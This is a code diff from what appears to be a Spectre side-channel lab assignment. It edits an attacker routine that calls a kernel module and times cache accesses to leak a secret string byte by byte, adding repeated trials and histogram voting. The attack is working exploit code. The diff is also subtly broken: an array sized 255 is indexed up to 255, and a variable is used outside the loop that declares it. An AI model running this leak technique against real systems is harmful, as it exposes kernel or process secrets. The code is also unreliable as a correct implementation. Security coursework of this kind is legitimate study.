@@ -48,33 +48,41 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     size_t current_offset = 0;
 
     printf("Launching attacker\n");
-
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
-        char leaked_byte;
-        int min = 100000;
-        clean_shared_memory_from_tlb(shared_memory);
-        call_kernel_part1(kernel_fd, shared_memory, current_offset);
-        int tmp;
-        for (int i = 0; i < 256; i++) {
-            tmp = time_access(shared_memory + (4096 * i));
-            if (tmp < min) {
-                min = tmp;
-                leaked_byte = i;
-            } 
-        }
-     
-        // [Part 1]- Fill this in!
-        // Feel free to create helper methods as necessary.
-        // Use "call_kernel_part1" to interact with the kernel module
-        // Find the value of leaked_byte for offset "current_offset"
-        // leaked_byte = ??
+        int hist[255] = {0};
+        for (int j = 0; j < 30; j++) {
+            char leaked_byte;
+            int min = 100000;
+            clean_shared_memory_from_tlb(shared_memory);
+            call_kernel_part1(kernel_fd, shared_memory, current_offset);
+            int tmp;
+            for (int i = 0; i < 256; i++) {
+                tmp = time_access(shared_memory + (4096 * i));
+                if (tmp < min) {
+                    min = tmp;
+                    leaked_byte = i;
+                }
 
-        leaked_str[current_offset] = leaked_byte;
+            }
+            hist[leaked_byte]++;
+        
+            // [Part 1]- Fill this in!
+            // Feel free to create helper methods as necessary.
+            // Use "call_kernel_part1" to interact with the kernel module
+            // Find the value of leaked_byte for offset "current_offset"
+            // leaked_byte = ??
+        }
+        int max = 0;
+        for (int i = 0; i < 256; i++) {
+            if (hist[max] < hist[i]) {
+                max = i;
+            }
+        }
+        leaked_str[current_offset] = max;
         if (leaked_byte == '\x00') {
             break;
         }
     }
-
     printf("\n\n[Part 1] We leaked:\n%s\n", leaked_str);
 
     close(kernel_fd);
